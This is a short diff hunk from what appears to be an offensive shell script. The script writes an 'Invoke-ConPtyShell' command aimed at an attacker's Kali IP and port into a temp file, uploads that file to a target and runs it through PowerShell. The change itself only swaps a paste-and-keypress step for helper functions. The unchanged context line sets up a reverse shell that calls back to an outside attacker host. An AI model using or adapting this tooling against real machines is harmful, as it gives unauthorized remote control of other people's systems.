@@ -15,5 +15,5 @@ echo "Invoke-ConPtyShell ${KALI_IP} ${SHELL_PORT}" >> $TMP_FILE
 
 cmd_upload_file "${LOCATION}" "${FILE}"
 
-paste_command "powershell -c '${FILE_LOCATION}'"
-xdotool key Return
+execute_command "powershell -c '${FILE_LOCATION}'"
+create_new_line
